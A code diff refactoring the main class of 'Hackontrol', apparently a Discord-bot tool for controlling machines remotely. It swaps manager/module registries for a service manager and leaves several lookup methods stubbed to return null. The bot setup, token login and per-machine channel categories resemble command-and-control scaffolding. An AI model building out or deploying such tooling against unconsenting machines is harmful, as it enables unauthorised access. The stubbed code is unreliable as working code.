@@ -1,7 +1,6 @@
 package com.khopan.hackontrol;
 
 import java.io.File;
-import java.util.Collections;
 import java.util.List;
 
 import javax.swing.JOptionPane;
@@ -15,14 +14,13 @@ import com.khopan.hackontrol.module.Module;
 import com.khopan.hackontrol.nativelibrary.Information;
 import com.khopan.hackontrol.panel.Panel;
 import com.khopan.hackontrol.panel.PanelManager;
-import com.khopan.hackontrol.registration.ManagerRegistry;
-import com.khopan.hackontrol.registration.ModuleRegistry;
 import com.khopan.hackontrol.registration.PanelRegistry;
-import com.khopan.hackontrol.registry.ClassRegistration;
+import com.khopan.hackontrol.registration.ServiceRegistry;
 import com.khopan.hackontrol.registry.Registration;
 import com.khopan.hackontrol.registry.RegistryType;
-import com.khopan.hackontrol.registry.implementation.FilteredTypeRegistry;
 import com.khopan.hackontrol.security.SecurityManager;
+import com.khopan.hackontrol.service.Service;
+import com.khopan.hackontrol.service.ServiceManager;
 import com.khopan.hackontrol.utils.ErrorHandler;
 import com.khopan.hackontrol.utils.HackontrolError;
 
@@ -42,8 +40,6 @@ public class Hackontrol {
 
 	private static Hackontrol INSTANCE;
 
-	private final List<Manager> managerList;
-	private final List<Module> moduleList;
 	private final JDA bot;
 	private final Guild guild;
 	private final String machineIdentifier;
@@ -54,21 +50,15 @@ public class Hackontrol {
 	private Hackontrol() {
 		Hackontrol.INSTANCE = this;
 		Thread.setDefaultUncaughtExceptionHandler(this :: handleError);
-		ManagerRegistry.register(FilteredTypeRegistry.of(null, Hackontrol.MANAGER_REGISTRY));
-		ModuleRegistry.register(FilteredTypeRegistry.of(null, Hackontrol.MODULE_REGISTRY));
-		this.managerList = ClassRegistration.list(null, Hackontrol.MANAGER_REGISTRY);
-		this.moduleList = ClassRegistration.list(null, Hackontrol.MODULE_REGISTRY);
+		ServiceManager serviceManager = new ServiceManager();
+		ServiceRegistry.register(serviceManager);
 
-		for(Module module : this.moduleList) {
-			Hackontrol.LOGGER.info("Registered module: {}", module.getClass().getName());
+		for(Service service : serviceManager.serviceList()) {
+			Hackontrol.LOGGER.info("Registered service: {}", service.getClass().getName());
 		}
 
 		JDABuilder builder = JDABuilder.createDefault(Information.getToken()).enableIntents(GatewayIntent.MESSAGE_CONTENT);
-
-		for(Manager manager : this.managerList) {
-			manager.configureBuilder(builder);
-		}
-
+		serviceManager.applyBuilder(builder);
 		this.bot = builder.build();
 
 		try {
@@ -77,6 +67,8 @@ public class Hackontrol {
 			throw new RuntimeException();
 		}
 
+		Hackontrol.LOGGER.info("Bot is ready");
+		serviceManager.initialize(this.bot);
 		this.guild = this.bot.getGuildById(1173967259304198154L);
 		this.machineIdentifier = Information.getMachineName();
 		String categoryName = this.machineIdentifier.toLowerCase();
@@ -149,39 +141,37 @@ public class Hackontrol {
 	}
 
 	public List<Manager> getManagerList() {
-		return Collections.unmodifiableList(this.managerList);
+		return null;//Collections.unmodifiableList(this.managerList);
 	}
 
-	@SuppressWarnings("unchecked")
 	public <T extends Manager> T getManager(Class<T> managerClass) {
 		if(managerClass == null) {
 			throw new NullPointerException("Manager class cannot be null");
 		}
 
-		for(Manager manager : this.managerList) {
+		/*for(Manager manager : this.managerList) {
 			if(managerClass.isAssignableFrom(manager.getClass())) {
 				return (T) manager;
 			}
-		}
+		}*/
 
 		return null;
 	}
 
 	public List<Module> getModuleList() {
-		return Collections.unmodifiableList(this.moduleList);
+		return null;//Collections.unmodifiableList(this.moduleList);
 	}
 
-	@SuppressWarnings("unchecked")
 	public <T extends Module> T getModule(Class<T> moduleClass) {
 		if(moduleClass == null) {
 			throw new NullPointerException("Module class cannot be null");
 		}
 
-		for(Module module : this.moduleList) {
+		/*for(Module module : this.moduleList) {
 			if(moduleClass.isAssignableFrom(module.getClass())) {
 				return (T) module;
 			}
-		}
+		}*/
 
 		return null;
 	}
@@ -191,11 +181,11 @@ public class Hackontrol {
 			throw new NullPointerException("Text channel cannot be null");
 		}
 
-		for(Module module : this.moduleList) {
+		/*for(Module module : this.moduleList) {
 			if(textChannel.equals(module.channel)) {
 				return module;
 			}
-		}
+		}*/
 
 		return null;
 	}
